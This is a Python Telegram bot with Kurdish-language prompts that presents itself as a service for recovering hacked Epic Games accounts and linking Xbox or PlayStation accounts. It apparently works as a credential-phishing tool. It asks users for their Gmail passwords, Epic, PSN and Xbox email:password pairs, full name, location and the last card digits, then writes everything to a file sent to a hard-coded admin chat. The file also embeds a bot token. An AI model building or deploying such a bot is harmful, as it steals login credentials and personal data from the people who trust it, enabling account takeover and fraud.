import os
import sys
import time

# OneDrive workaround
if 'OneDrive' in os.path.abspath(__file__):
    print("Running in OneDrive - using workaround (may be slower)")
    time.sleep(2)  # Give OneDrive time to sync
    os.environ['PYTHONIOENCODING'] = 'utf-8'

import logging

import site
print(site.getsitepackages())

from datetime import datetime, timezone


from datetime import datetime, timezone
from zoneinfo import ZoneInfo

# Force Python to recognize imports from virtual environment
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Import with explicit error handling
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    Image = None

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        CallbackQueryHandler,
        ConversationHandler,
        filters,
        ContextTypes,
    )
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

# Verify all imports are available
if not all([PIL_AVAILABLE, TELEGRAM_AVAILABLE]):
    missing = []
    if not PIL_AVAILABLE:
        missing.append("pillow (PIL)")
    if not TELEGRAM_AVAILABLE:
        missing.append("python-telegram-bot")
    sys.exit(f"Missing required packages: {', '.join(missing)}\n"
             f"Please run: pip install {' '.join(missing)}")

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Conversation states
(ORIGINAL_EMAIL_YN, ORIGINAL_EMAIL, ORIGINAL_EMAIL_PASS_YN, ORIGINAL_EMAIL_PASS,
 CURRENT_EMAIL_YN, CURRENT_EMAIL, CURRENT_EMAIL_PASS_YN, CURRENT_EMAIL_PASS,
 ORIGINAL_DISPLAYNAME_YN, ORIGINAL_DISPLAYNAME, CURRENT_DISPLAYNAME_YN, CURRENT_DISPLAYNAME,
 FULL_NAME_YN, FULL_NAME, CONNECTED_ACCOUNTS_YN, CONNECTED_ACCOUNTS,
 LOCATION_YN, LOCATION, PURCHASE_YN, PURCHASE_DETAILS) = range(20)

(LINK_EPIC_DETAILS_YN, LINK_EPIC_DETAILS, LINK_PLATFORM,
 LINK_PS_ACCOUNT_YN, LINK_PS_ACCOUNT, LINK_XBOX_ACCOUNT_YN, LINK_XBOX_ACCOUNT) = range(20, 27)

# Configuration (you can change these values)
BOT_TOKEN = "8132753996:AAHilkC9Xq00ZX_pLphkU14Woo4xo0Kcmko"
ADMIN_ID = 1909548202

class ImghdrReplacement:
    @staticmethod
    def what(file):
        try:
            with Image.open(file) as img:
                return img.format.lower()
        except Exception:
            return None

imghdr = ImghdrReplacement()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await update.message.reply_text(
        f"سڵاو {user.first_name}! لە ڕێی ئەم بۆتەوە ئەتوانم یارمەتیتان بەم بۆ هێنانەوەی ئەکاونتی دزراو یان هاک کراو ، وە هەروەها بۆ لینک کردنی ئەکاونتیش.\n"
        "بەکارهێنانی /recover بۆ هێنانەوەی ئەکاونتی دزراو یان هاک کراو یان /link بۆ لینک کردنی ئەکاونت."
    )

async def recover(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data'] = {
        'user_id': update.effective_user.id,
        'username': update.effective_user.username or update.effective_user.full_name,
        'timestamp': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    }
    
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_original_email'),
        InlineKeyboardButton("نەخێر", callback_data='no_original_email')
    ]]
    await update.message.reply_text(
        "1: ئیمێڵی ئۆرجیناڵی ئەکاونتی ئیپیکەکەو لایە ( ئەو ئیمێڵەی کە یەکەم جار ئیپیکەکەو لەسەری دروس کراوە )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ORIGINAL_EMAIL_YN

async def original_email_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_original_email':
        await query.edit_message_text("تکایە ئیمێڵە ئۆرجیناڵەکە بنێرە:")
        return ORIGINAL_EMAIL
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_current_email'),
            InlineKeyboardButton("نەخێر", callback_data='no_current_email')
        ]]
        await query.edit_message_text(
            "2: ئیمێڵی ئێستەی ئەکاونتی ئیپیکەکەو لایە ( ئەو ئیمێڵەی کە ئێستە ئیپیکەکەو لەسەریەتی )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CURRENT_EMAIL_YN

async def original_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['original_email'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_original_email_pass'),
        InlineKeyboardButton("نەخێر", callback_data='no_original_email_pass')
    ]]
    await update.message.reply_text(
        "1.1: پاسۆردی بەرنامەی جیمێڵی ئیمێڵە ئۆرجیناڵەکەو لایە؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ORIGINAL_EMAIL_PASS_YN

async def original_email_pass_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_original_email_pass':
        await query.edit_message_text("تکایە پاسۆردی جیمێڵە ئۆرجیناڵەکە بنێرە:")
        return ORIGINAL_EMAIL_PASS
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_current_email'),
            InlineKeyboardButton("نەخێر", callback_data='no_current_email')
        ]]
        await query.edit_message_text(
            "2: ئیمێڵی ئێستەی ئەکاونتی ئیپیکەکەو لایە ( ئەو ئیمێڵەی کە ئێستە ئیپیکەکەو لەسەریەتی )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CURRENT_EMAIL_YN

async def original_email_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['original_email_pass'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_current_email'),
        InlineKeyboardButton("نەخێر", callback_data='no_current_email')
    ]]
    await update.message.reply_text(
        "2: ئیمێڵی ئێستەی ئەکاونتی ئیپیکەکەو لایە ( ئەو ئیمێڵەی کە ئێستە ئیپیکەکەو لەسەریەتی )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return CURRENT_EMAIL_YN

async def current_email_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_current_email':
        await query.edit_message_text("تکایە ئیمێڵی ئیستەی ئیپیکەکە بنێرە:")
        return CURRENT_EMAIL
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_original_displayname'),
            InlineKeyboardButton("نەخێر", callback_data='no_original_displayname')
        ]]
        await query.edit_message_text(
            "3: ناوی یەکەم جاری ئەکاونتی ئیپیکەکەو لایە ( یەکەم جار کە ئەکاونتەکەو دروست کراوە چ ناوێکی بۆ داندراوە )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return ORIGINAL_DISPLAYNAME_YN

async def current_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['current_email'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_current_email_pass'),
        InlineKeyboardButton("نەخێر", callback_data='no_current_email_pass')
    ]]
    await update.message.reply_text(
        "2.1: پاسۆردی بەرنامەی جیمێڵی ئیمێڵەکەی ئێستەو لایە؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return CURRENT_EMAIL_PASS_YN

async def current_email_pass_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_current_email_pass':
        await query.edit_message_text("تکایە پاسۆردی جیمێڵەکەی ئێستەو بنێرە:")
        return CURRENT_EMAIL_PASS
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_original_displayname'),
            InlineKeyboardButton("نەخێر", callback_data='no_original_displayname')
        ]]
        await query.edit_message_text(
            "3: ناوی یەکەم جاری ئەکاونتی ئیپیکەکەو لایە ( یەکەم جار کە ئەکاونتەکەو دروست کراوە چ ناوێکی بۆ داندراوە )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return ORIGINAL_DISPLAYNAME_YN

async def current_email_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['current_email_pass'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_original_displayname'),
        InlineKeyboardButton("نەخێر", callback_data='no_original_displayname')
    ]]
    await update.message.reply_text(
        "3: ناوی یەکەم جاری ئەکاونتی ئیپیکەکەو لایە ( یەکەم جار کە ئەکاونتەکەو دروست کراوە چ ناوێکی بۆ داندراوە )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return ORIGINAL_DISPLAYNAME_YN

async def original_displayname_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_original_displayname':
        await query.edit_message_text("تکایە ناوی یەکەم جاری ئیپیکەکەو بنێرە:")
        return ORIGINAL_DISPLAYNAME
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_current_displayname'),
            InlineKeyboardButton("نەخێر", callback_data='no_current_displayname')
        ]]
        await query.edit_message_text(
            "3.1: ناوی ئێستەی ئەکاونتی ئیپیکەکەو لایە ( ئێستە لە ئیپیک ئەکاونتەکەو ناوی چیە )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CURRENT_DISPLAYNAME_YN

async def original_displayname(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['original_displayname'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_current_displayname'),
        InlineKeyboardButton("نەخێر", callback_data='no_current_displayname')
    ]]
    await update.message.reply_text(
        "3.1: ناوی ئێستەی ئەکاونتی ئیپیکەکەو لایە ( ئێستە لە ئیپیک ئەکاونتەکەو ناوی چیە )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return CURRENT_DISPLAYNAME_YN

async def current_displayname_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_current_displayname':
        await query.edit_message_text("تکایە ناوی ئێستەی ئیپیکەکەو بنێرە:")
        return CURRENT_DISPLAYNAME
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_full_name'),
            InlineKeyboardButton("نەخێر", callback_data='no_full_name')
        ]]
        await query.edit_message_text(
            "4: ناوی یەکەم و دووەمی ئەکاونتی ئیپیکەکەو لایە ( first name و last name )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return FULL_NAME_YN

async def current_displayname(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['current_displayname'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_full_name'),
        InlineKeyboardButton("نەخێر", callback_data='no_full_name')
    ]]
    await update.message.reply_text(
        "4: ناوی یەکەم و دووەمی ئەکاونتی ئیپیکەکەو لایە ( first name و last name )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return FULL_NAME_YN

async def full_name_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_full_name':
        await query.edit_message_text("تکایە ناوی یەکەم و دووەم بنێرە:")
        return FULL_NAME
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_connected_accounts'),
            InlineKeyboardButton("نەخێر", callback_data='no_connected_accounts')
        ]]
        await query.edit_message_text(
            "5: ئەکاونتی ئیپیکەکەو لینکی هیچ کۆنسڵێک کراوە وەک “ xbox , playstation , … “ ئەگەر کراوە ناوی لینکە کۆنەکان و لینکەکانی ئێستەش بنێرە!؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return CONNECTED_ACCOUNTS_YN

async def full_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['full_name'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_connected_accounts'),
        InlineKeyboardButton("نەخێر", callback_data='no_connected_accounts')
    ]]
    await update.message.reply_text(
        "5: ئەکاونتی ئیپیکەکەو لینکی هیچ کۆنسڵێک کراوە وەک “ xbox , playstation , … “ ئەگەر کراوە ناوی لینکە کۆنەکان و لینکەکانی ئێستەش بنێرە!؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return CONNECTED_ACCOUNTS_YN

async def connected_accounts_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_connected_accounts':
        await query.edit_message_text("تکایە ناوی هەموو ئەو کۆنسڵانە بنێرە کە ئێستە لینکن لەسەر ئیپیکەکەو ، یان پێشتر لینک بوون ، بەم جۆرە: ئێستە: ئێکسبۆکس: ناوەکەی لێرە بنوسە / پلەیستەیشن: ناوەکەی لێرە بنوسە… ( تکایە با لە ١ نامە بێت ) پێشتر: ئێکسبۆکس: ناوەکەی لێرە بنوسە / پلەیستەیشن: ناوەکەی لێرە بنوسە… ( تکایە با لە ١ نامە بێت ):")
        return CONNECTED_ACCOUNTS
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_location'),
            InlineKeyboardButton("نەخێر", callback_data='no_location')
        ]]
        await query.edit_message_text(
            "6: لۆکەیشنی تەواوی ئەو شوێنە ئەزانی کە ئەکاونتی ئیپیکەکەی لێ دروس کراوە ( وڵات ، هەرێم ، شار )؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return LOCATION_YN

async def connected_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['connected_accounts'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_location'),
        InlineKeyboardButton("نەخێر", callback_data='no_location')
    ]]
    await update.message.reply_text(
        "6: لۆکەیشنی تەواوی ئەو شوێنە ئەزانی کە ئەکاونتی ئیپیکەکەی لێ دروس کراوە ( وڵات ، هەرێم ، شار )؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return LOCATION_YN

async def location_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_location':
        await query.edit_message_text("تکایە لۆکەیشنی تەواو بنێرە بۆ نمونە بەم جۆرە ( عێراق ، کوردستان ، سلێمانی ):")
        return LOCATION
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_purchase'),
            InlineKeyboardButton("نەخێر", callback_data='no_purchase')
        ]]
        await query.edit_message_text(
            "7: لە ئیپیک گەیمس بە ڕێگەی Visa Card یان Master Card هیچ شتێک کڕدراوە؟",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return PURCHASE_YN

async def location(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['location'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_purchase'),
        InlineKeyboardButton("نەخێر", callback_data='no_purchase')
    ]]
    await update.message.reply_text(
        "7: لە ئیپیک گەیمس بە ڕێگەی Visa Card یان Master Card هیچ شتێک کڕدراوە؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return PURCHASE_YN

async def purchase_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_purchase':
        await query.edit_message_text("تکایە ٤ ژمارەی کۆتای کارتەکە بنێرە نمونە، 0987 :")
        return PURCHASE_DETAILS
    else:
        return await finish_recovery(update, context)

async def purchase_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['recovery_data']['purchase_details'] = update.message.text
    return await finish_recovery(update, context)

async def finish_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_data = context.user_data['recovery_data']
    filename = f"recovery_{user_data['user_id']}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
    
    try:
        with open(filename, 'w') as f:
            for key, value in user_data.items():
                f.write(f"{key}: {value}\n")
        
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=open(filename, 'rb'),
            caption=f"Recovery data from {user_data['username']} (ID: {user_data['user_id']})"
        )
    finally:
        if os.path.exists(filename):
            os.remove(filename)
    
    if update.callback_query:
        await update.callback_query.edit_message_text("سپاس بۆ بەکەرهێنانی بۆتەکەمان بۆ چارەسەر کردنی ئەکاونتەکەو، ئەگەر شتێکمان پێویست بوو پەیوەندیو پێوە دەکەین.")
    else:
        await update.message.reply_text("سپاس بۆ بەکەرهێنانی بۆتەکەمان بۆ چارەسەر کردنی ئەکاونتەکەو، ئەگەر شتێکمان پێویست بوو پەیوەندیو پێوە دەکەین.")
    
    return ConversationHandler.END

async def link(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['linking_data'] = {
        'user_id': update.effective_user.id,
        'username': update.effective_user.username or update.effective_user.full_name,
        'timestamp': datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    }
    
    keyboard = [[
        InlineKeyboardButton("بەڵێ", callback_data='yes_epic_details'),
        InlineKeyboardButton("نەخێر", callback_data='no_epic_details')
    ]]
    await update.message.reply_text(
        "1: ئیمێڵ و پاسۆردی ئەو ئیپیکەو لایە کە ئەتەوێ لینکی کەین؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return LINK_EPIC_DETAILS_YN

async def link_epic_details_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_epic_details':
        await query.edit_message_text("تکایە ئیمێڵ و پاسۆردەکە بنێرە با بەم جۆرە بێت (email:password) واتە: test@gmail.com:test0909")
        return LINK_EPIC_DETAILS
    else:
        await query.edit_message_text("ببورە، بە بێ ئیمێڵ و پاسۆردی ئیپیک ناتوانین ئەکاونت لینک کەین.")
        return ConversationHandler.END

async def link_epic_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['linking_data']['epic_details'] = update.message.text
    keyboard = [[
        InlineKeyboardButton("ئێکسبۆکس", callback_data='xbox'),
        InlineKeyboardButton("پلەیستەیشن", callback_data='playstation')
    ]]
    await update.message.reply_text(
        "2: ئەتەوێ لینکی چی کەین؟",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return LINK_PLATFORM

async def link_platform(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    platform = query.data
    context.user_data['linking_data']['platform'] = platform
    
    if platform == 'playstation':
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_ps_account'),
            InlineKeyboardButton("نەخێر", callback_data='no_ps_account')
        ]]
        await query.edit_message_text(
            "2.1: ئەکاونتێکی تازەی پلەیستەیشن لایە؟ بۆ ئەوەی لینکی کەینە سەر ئیپیکەکە.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return LINK_PS_ACCOUNT_YN
    else:
        keyboard = [[
            InlineKeyboardButton("بەڵێ", callback_data='yes_xbox_account'),
            InlineKeyboardButton("نەخێر", callback_data='no_xbox_account')
        ]]
        await query.edit_message_text(
            "2.2: ئەکاونتێکی تازەی ئێکسبۆکس لایە؟ بۆ ئەوەی لینکی کەینە سەر ئیپیکەکە.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return LINK_XBOX_ACCOUNT_YN

async def link_ps_account_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_ps_account':
        await query.edit_message_text("تکایە ئیمێڵ و پاسۆردەکە بنێرە با بەم جۆرە بێت (email:password) واتە: test@gmail.com:test0909")
        return LINK_PS_ACCOUNT
    else:
        return await finish_linking(update, context)

async def link_ps_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['linking_data']['ps_account'] = update.message.text
    return await finish_linking(update, context)

async def link_xbox_account_yn(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    
    if query.data == 'yes_xbox_account':
        await query.edit_message_text("تکایە ئیمێڵ و پاسۆردەکە بنێرە با بەم جۆرە بێت (email:password) واتە: test@gmail.com:test0909")
        return LINK_XBOX_ACCOUNT
    else:
        return await finish_linking(update, context)

async def link_xbox_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['linking_data']['xbox_account'] = update.message.text
    return await finish_linking(update, context)

async def finish_linking(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_data = context.user_data['linking_data']
    filename = f"linking_{user_data['user_id']}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
    
    try:
        with open(filename, 'w') as f:
            for key, value in user_data.items():
                f.write(f"{key}: {value}\n")
        
        await context.bot.send_document(
            chat_id=ADMIN_ID,
            document=open(filename, 'rb'),
            caption=f"Linking data from {user_data['username']} (ID: {user_data['user_id']})"
        )
    finally:
        if os.path.exists(filename):
            os.remove(filename)
    
    if update.callback_query:
        await update.callback_query.edit_message_text("سپاس بۆ بەکارهێنانی بۆتەکەمان بۆ لینک کردنی ئەکاونتەکەو، ئەگەر شتێکمان پێویست بوو پەیوەندیو پێوە دەکەین.")
    else:
        await update.message.reply_text("سپاس بۆ بەکارهێنانی بۆتەکەمان بۆ لینک کردنی ئەکاونتەکەو، ئەگەر شتێکمان پێویست بوو پەیوەندیو پێوە دەکەین.")
    
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text('Operation cancelled.')
    return ConversationHandler.END

def main() -> None:
    """Run the bot."""
    try:
        application = Application.builder().token(BOT_TOKEN).build()

        # Add command handlers
        application.add_handler(CommandHandler("start", start))

        # Add conversation handler for recovery
        recovery_conv_handler = ConversationHandler(
            entry_points=[CommandHandler('recover', recover)],
        states={
            ORIGINAL_EMAIL_YN: [CallbackQueryHandler(original_email_yn)],
            ORIGINAL_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, original_email)],
            ORIGINAL_EMAIL_PASS_YN: [CallbackQueryHandler(original_email_pass_yn)],
            ORIGINAL_EMAIL_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, original_email_pass)],
            CURRENT_EMAIL_YN: [CallbackQueryHandler(current_email_yn)],
            CURRENT_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, current_email)],
            CURRENT_EMAIL_PASS_YN: [CallbackQueryHandler(current_email_pass_yn)],
            CURRENT_EMAIL_PASS: [MessageHandler(filters.TEXT & ~filters.COMMAND, current_email_pass)],
            ORIGINAL_DISPLAYNAME_YN: [CallbackQueryHandler(original_displayname_yn)],
            ORIGINAL_DISPLAYNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, original_displayname)],
            CURRENT_DISPLAYNAME_YN: [CallbackQueryHandler(current_displayname_yn)],
            CURRENT_DISPLAYNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, current_displayname)],
            FULL_NAME_YN: [CallbackQueryHandler(full_name_yn)],
            FULL_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, full_name)],
            CONNECTED_ACCOUNTS_YN: [CallbackQueryHandler(connected_accounts_yn)],
            CONNECTED_ACCOUNTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, connected_accounts)],
            LOCATION_YN: [CallbackQueryHandler(location_yn)],
            LOCATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, location)],
            PURCHASE_YN: [CallbackQueryHandler(purchase_yn)],
            PURCHASE_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, purchase_details)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

        # Add conversation handler for linking
        linking_conv_handler = ConversationHandler(
            entry_points=[CommandHandler('link', link)],
            states={
            LINK_EPIC_DETAILS_YN: [CallbackQueryHandler(link_epic_details_yn)],
            LINK_EPIC_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, link_epic_details)],
            LINK_PLATFORM: [CallbackQueryHandler(link_platform)],
            LINK_PS_ACCOUNT_YN: [CallbackQueryHandler(link_ps_account_yn)],
            LINK_PS_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, link_ps_account)],
            LINK_XBOX_ACCOUNT_YN: [CallbackQueryHandler(link_xbox_account_yn)],
            LINK_XBOX_ACCOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, link_xbox_account)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

        application.add_handler(recovery_conv_handler)
        application.add_handler(linking_conv_handler)

        application.run_polling(allowed_updates=Update.ALL_TYPES)

    except Exception as e:
        logger.error(f"Bot crashed with error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()